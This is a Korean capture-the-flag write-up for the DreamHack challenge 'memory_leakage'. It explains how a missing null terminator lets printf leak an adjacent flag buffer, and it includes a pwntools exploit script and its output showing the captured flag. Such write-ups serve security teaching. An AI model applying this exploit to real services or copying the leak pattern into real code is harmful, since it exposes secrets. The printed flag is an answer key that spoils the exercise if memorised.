# [DreamHack] memory_leakage

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(memory_leakage)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [memory_leakage.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8556947/memory_leakage.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162668306-992f61c2-67dc-455d-8a14-9471c03ffc3d.png)

## Analysis

### my_page

```c
struct my_page {
	char name[16];
	int age;
};
```

### 1. Join

```c
			case 1:
				printf("Name: ");
				read(0, my_page.name, sizeof(my_page.name));

				printf("Age: ");
				scanf("%d", &my_page.age);
				break;
```

`name`과 `age`를 입력받는다.

### 2. Print information

```c
			case 2:
				printf("Name: %s\n", my_page.name); // memory leak
				printf("Age: %d\n", my_page.age);
				break;
```

`main()`의 스택에는 `my_page`와 `flag_buf`가 이어져 있다. `my_page.name`의 16바이트와 `my_page.age`의 4바이트를 `'\x00'` 없이 채워놓으면 `flag_buf`까지 같이 출력된다.

### 3. GIVE ME FLAG!

```c
			case 3:
				fp = fopen("/flag", "r");
				fread(flag_buf, 1, 56, fp);
				break;
```

`flag_buf`에 플래그를 읽어온다.

## Exploit

`flag_buf`에 플래그를 읽어온 뒤에 `2. Print information`으로 `flag_buf`를 leak하면 플래그를 획득할 수 있다.

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/memory_leakage')
else:
    r = remote('host1.dreamhack.games', 21779)

sla = r.sendlineafter
sa = r.sendafter

sla('> ', '1')
sa('Name: ', 'a' * 16)
sla('Age: ', str(0xffffffff))

sla('> ', '3')
sla('> ', '2')

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 21779: Done
[*] Switching to interactive mode
Name: aaaaaaaaaaaaaaaa\xff\xff\xff\x7fDH{a77ae81944bbbe70adb10d98dc191379}
Age: 2147483647
1. Join
2. Print information
3. GIVE ME FLAG!
> $
```